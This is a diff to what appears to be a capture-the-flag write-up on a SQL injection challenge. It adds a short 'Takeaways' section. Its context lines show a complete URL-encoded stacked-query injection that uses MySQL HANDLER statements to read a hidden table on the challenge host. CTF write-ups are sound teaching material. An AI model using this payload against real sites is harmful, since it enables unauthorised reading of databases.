@@ -84,3 +84,7 @@ The **final injection** is therefore:
 ```
 
 The corresponding URL to retrieve the flag (if the site was up) would be: http://ctf-f3jj.balancedcompo.site:9000/?inject=%27;%20HANDLER%20%601919810931114514%60%20OPEN;%20HANDLER%20%601919810931114514%60%20READ%20FIRST;--
+
+## Takeaways
+* Always check for all options/types of exploits! Start from easy things then build up to more complex possible solutions/bypasses
+* HANDLER is something I’ve never encountered before, so pretty cool!
